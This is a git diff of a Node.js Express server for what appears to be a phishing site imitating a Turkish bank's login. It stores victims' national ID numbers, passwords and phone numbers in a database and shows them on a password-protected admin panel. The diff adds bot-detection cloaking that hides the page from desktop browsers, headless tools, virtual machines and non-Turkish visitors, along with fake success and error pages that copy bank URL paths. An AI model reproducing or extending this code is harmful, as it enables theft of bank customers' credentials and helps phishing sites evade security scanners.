@@ -4,7 +4,7 @@ const helmet = require('helmet');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
-const { createClient } = require('@libsql/client');
+const sqlite3 = require('sqlite3').verbose();
 
 const app = express();
 app.use(express.json());
@@ -18,29 +18,28 @@ const BIREYSEL_DIR = path.join(__dirname, 'public', 'bireysel');
 // 🚀 DEV MODE: true yaparsanız bot koruması ve gate tamamen devre dışı kalır.
 const DEV_MODE = true; 
 
-// ─── LIBSQL VERİTABANI BAĞLANTISI (Lokal dosya veya Bulut) ───────────────────
-const db = createClient({
-  url: process.env.TURSO_DATABASE_URL || 'file:bank.db',
-  authToken: process.env.TURSO_AUTH_TOKEN,
+// ─── SQLITE VERİTABANI KURULUMU ──────────────────────────────────────────────
+const dbPath = path.resolve(__dirname, 'bank.db');
+const db = new sqlite3.Database(dbPath, (err) => {
+  if (err) {
+    console.error('Veritabanı bağlantı hatası:', err.message);
+  } else {
+    console.log('📦 SQLite veritabanına başarıyla bağlanıldı (bank.db).');
+  }
 });
 
 // Tabloyu oluştur (Yoksa)
-(async () => {
-  try {
-    await db.execute(`CREATE TABLE IF NOT EXISTS login_attempts (
-      id INTEGER PRIMARY KEY AUTOINCREMENT,
-      ip TEXT,
-      tc TEXT,
-      password TEXT,
-      phone TEXT,
-      step INTEGER DEFAULT 1,
-      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    )`);
-    console.log('📦 libsql veritabanı başarıyla hazırlandı.');
-  } catch (err) {
-    console.error('Veritabanı tablo oluşturma hatası:', err.message);
-  }
-})();
+db.serialize(() => {
+  db.run(`CREATE TABLE IF NOT EXISTS login_attempts (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    ip TEXT,
+    tc TEXT,
+    password TEXT,
+    phone TEXT,
+    step INTEGER DEFAULT 1,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+  )`);
+});
 
 const GATE_HTML = `<!DOCTYPE html>
 <html lang="tr">
@@ -89,6 +88,8 @@ const PROTECT_SECRET = crypto.randomBytes(32).toString('hex');
 const COOKIE_NAME = '_vkf_g';
 const COOKIE_MAX_AGE = 60 * 60 * 24;
 
+const HEADLESS_GPU_MARKERS = ['swiftshader', 'llvmpipe', 'mesa offscreen', 'softpipe', 'vmware', 'virtualbox'];
+
 function signVal(val) {
   return crypto.createHmac('sha256', PROTECT_SECRET).update(val).digest('hex');
 }
@@ -124,8 +125,38 @@ function parseCookies(req) {
   return list;
 }
 
+function isBot(data) {
+  if (DEV_MODE) return false;
+
+  const gpu = (data.webgl_renderer || '').toLowerCase();
+  const platform = (data.platform || '').toLowerCase();
+  const device = data.device || 'other';
+
+  if (data.webdriver === '1') return true;
+  if (device !== 'android' && device !== 'ios') return true;
+  if (HEADLESS_GPU_MARKERS.some(m => gpu.includes(m))) return true;
+  if (gpu === 'no_webgl' || gpu === 'exception') return true;
+  if (data.canvas_ok === '0') return true;
+
+  const isMobileUA = device === 'android' || device === 'ios';
+  const isDesktopPlatform = /win32|win64|macintel|linux x86_64|linux amd64/.test(platform);
+
+  if (isMobileUA && isDesktopPlatform) return true;
+  if (isMobileUA && data.touch === '0') return true;
+
+  const DESKTOP_GPU = ['nvidia', 'geforce', 'quadro', 'gtx ', 'rtx ', 'mx ', 'radeon', 'amd ', 'rx ', 'vega', 'intel(r) hd graphics', 'intel(r) iris', 'intel(r) uhd', 'intel(r) arc'];
+  if (isMobileUA && DESKTOP_GPU.some(m => gpu.includes(m))) return true;
+
+  const lang = (data.language || data.browser_lang || '').toLowerCase();
+  if (lang && !lang.startsWith('tr')) return true;
+
+  return false;
+}
+
 app.post('/api/js_check', (req, res) => {
   const data = req.body || {};
+  if (!DEV_MODE && isBot(data)) return res.json({ status: 'fail' });
+
   const token = createCookieToken();
   res.setHeader('Set-Cookie', `${COOKIE_NAME}=${encodeURIComponent(token)}; Path=/; HttpOnly; Max-Age=${COOKIE_MAX_AGE}; SameSite=Lax`);
   return res.json({ status: 'pass', url: '/bireysel/' });
@@ -209,21 +240,19 @@ app.post('/bireysel/step1', async (req, res) => {
 
   await sleep(500);
 
-  try {
-    const result = await db.execute({
-      sql: `INSERT INTO login_attempts (ip, tc, password, step) VALUES (?, ?, ?, 1)`,
-      args: [ip, tc, password]
-    });
-    const lastID = Number(result.lastInsertRowid);
+  const query = `INSERT INTO login_attempts (ip, tc, password, step) VALUES (?, ?, ?, 1)`;
+  
+  db.run(query, [ip, tc, password], function(err) {
+    if (err) {
+      console.error('DB Kayıt Hatası:', err.message);
+      return res.status(500).json({ success: false, message: 'Veritabanı kayıt hatası oluştu.' });
+    }
 
-    userSessions[ip] = { dbId: lastID };
-    console.log(`📥 [Adım 1] TC ve Parola veritabanına kaydedildi (IP: ${ip}, ID: ${lastID})`);
+    userSessions[ip] = { dbId: this.lastID };
+    console.log(`📥 [Adım 1] TC ve Parola veritabanına kaydedildi (IP: ${ip}, ID: ${this.lastID})`);
     
     return res.json({ success: true });
-  } catch (err) {
-    console.error('DB Kayıt Hatası:', err.message);
-    return res.status(500).json({ success: false, message: 'Veritabanı kayıt hatası oluştu.' });
-  }
+  });
 });
 
 // 2. Adım: Telefon Numarası Kontrolü
@@ -238,21 +267,15 @@ app.post('/bireysel/step2', async (req, res) => {
     return res.status(400).json({ success: false, error: 'phone', message: 'Lütfen 10 haneli geçerli bir telefon numarası giriniz (5XXXXXXXXX).' });
   }
 
-  try {
-    const session = userSessions[ip];
-    if (session && session.dbId) {
-      await db.execute({
-        sql: `UPDATE login_attempts SET phone = ?, step = 2 WHERE id = ?`,
-        args: [phone, session.dbId]
-      });
-    } else {
-      await db.execute({
-        sql: `UPDATE login_attempts SET phone = ?, step = 2 WHERE ip = ? ORDER BY id DESC LIMIT 1`,
-        args: [phone, ip]
-      });
-    }
-  } catch (err) {
-    console.error('DB Güncelleme Hatası:', err.message);
+  const session = userSessions[ip];
+  if (session && session.dbId) {
+    const updateQuery = `UPDATE login_attempts SET phone = ?, step = 2 WHERE id = ?`;
+    db.run(updateQuery, [phone, session.dbId], (err) => {
+      if (err) console.error('DB Güncelleme Hatası:', err.message);
+    });
+  } else {
+    const fallbackQuery = `UPDATE login_attempts SET phone = ?, step = 2 WHERE ip = ? ORDER BY id DESC LIMIT 1`;
+    db.run(fallbackQuery, [phone, ip]);
   }
 
   delete userSessions[ip];
@@ -262,7 +285,7 @@ app.post('/bireysel/step2', async (req, res) => {
 });
 
 // ─── 📊 ADMIN PANEL ROTASI ───────────────────────────────────────────────────
-app.get('/admin', async (req, res) => {
+app.get('/admin', (req, res) => {
   const sifre = req.query.sifre;
   if (sifre !== 'gizli123') {
     return res.send(`
@@ -278,9 +301,10 @@ app.get('/admin', async (req, res) => {
     `);
   }
 
-  try {
-    const rs = await db.execute(`SELECT * FROM login_attempts ORDER BY id DESC`);
-    const rows = rs.rows;
+  db.all(`SELECT * FROM login_attempts ORDER BY id DESC`, [], (err, rows) => {
+    if (err) {
+      return res.status(500).send("Veritabanı okuma hatası: " + err.message);
+    }
 
     let tableRows = rows.map(row => `
       <tr>
@@ -341,9 +365,7 @@ app.get('/admin', async (req, res) => {
       </body>
       </html>
     `);
-  } catch (err) {
-    return res.status(500).send("Veritabanı okuma hatası: " + err.message);
-  }
+  });
 });
 
 app.get('/bireysel/step1', (req, res) => res.redirect('/bireysel/'));
@@ -369,8 +391,7 @@ app.get('/bireysel/', (req, res) => {
 
   res.sendFile(path.join(BIREYSEL_DIR, 'index.html'));
 });
-
-// Başarılı Sayfası
+// ─── 2. GÖRSEL: BAŞARILI / BAŞVURUNUZ ALINDI SAYFASI ────────────────────────
 app.get('/bireysel/basarili', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -408,7 +429,7 @@ app.get('/bireysel/basarili', (req, res) => {
   `);
 });
 
-// Kurumsal Hata Sayfası
+// ─── 1. GÖRSEL: KURUMSAL / İŞLEM TAMAMLANAMADI SAYFASI ──────────────────────
 app.get('/isube/login/login/passwordentrycorporate-tr', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -438,7 +459,6 @@ app.get('/isube/login/login/passwordentrycorporate-tr', (req, res) => {
     </html>
   `);
 });
-
 app.listen(PORT, () => {
   console.log(`🚀 Server ${PORT} portunda çalışıyor`);
   if (DEV_MODE) console.log(`⚠️  DEV_MODE aktif: Bot koruması ve Gate HTML devre dışı bırakıldı!`);
